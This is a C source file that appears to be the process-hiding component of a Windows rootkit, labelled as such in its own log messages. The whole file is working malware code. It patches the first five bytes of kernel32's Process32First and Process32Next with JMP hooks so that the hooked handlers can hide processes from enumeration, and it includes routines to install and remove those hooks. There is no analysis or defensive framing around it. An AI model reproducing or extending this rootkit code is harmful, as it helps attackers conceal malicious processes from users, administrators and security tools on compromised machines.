#include "proc_hide.h"
#include <windows.h>
#include <stdio.h>

typedef struct {
    LPVOID original_function;
    LPVOID hooked_function;
    BYTE original_bytes[5];
    BYTE hooked_bytes[5];
} hook_t;

hook_t hook_process32first = { 0 };
hook_t hook_process32next = { 0 };

int install_hook(LPVOID target, LPVOID hook, hook_t* hook_info) {
    DWORD old_protect;
    hook_info->original_function = target;
    hook_info->hooked_function = hook;
    memcpy(hook_info->original_bytes, target, 5);
    DWORD relative_address = (DWORD)hook - (DWORD)target - 5;
    hook_info->hooked_bytes[0] = 0xE9;
    memcpy(&hook_info->hooked_bytes[1], &relative_address, 4);
    if (!VirtualProtect(target, 5, PAGE_EXECUTE_READWRITE, &old_protect)) {
        printf("[rootkit] failed to change memory protection\n");
        return 0;
    }
    memcpy(target, hook_info->hooked_bytes, 5);
    VirtualProtect(target, 5, old_protect, &old_protect);
    FlushInstructionCache(GetCurrentProcess(), target, 5);
    return 1;
}

int remove_hook(hook_t* hook_info) {
    DWORD old_protect;
    if (!hook_info->original_function) return 0;
    if (!VirtualProtect(hook_info->original_function, 5, PAGE_EXECUTE_READWRITE, &old_protect)) {
        return 0;
    }
    memcpy(hook_info->original_function, hook_info->original_bytes, 5);
    VirtualProtect(hook_info->original_function, 5, old_protect, &old_protect);
    FlushInstructionCache(GetCurrentProcess(), hook_info->original_function, 5);
    return 1;
}

void install_hooks(void) {
    HMODULE kernel32 = GetModuleHandle("kernel32.dll");
    LPVOID process32first_addr = GetProcAddress(kernel32, "Process32First");
    if (process32first_addr) {
        if (install_hook(process32first_addr, hooked_Process32First, &hook_process32first)) {
            printf("[rootkit] hooked Process32First\n");
        }
    }
    LPVOID process32next_addr = GetProcAddress(kernel32, "Process32Next");
    if (process32next_addr) {
        if (install_hook(process32next_addr, hooked_Process32Next, &hook_process32next)) {
            printf("[rootkit] hooked Process32Next\n");
        }
    }
}

void remove_hooks(void) {
    if (hook_process32first.original_function) {
        remove_hook(&hook_process32first);
        printf("[+] Removed Process32First hook\n");
    }

    if (hook_process32next.original_function) {
        remove_hook(&hook_process32next);
        printf("[+] Removed Process32Next hook\n");
    }
}
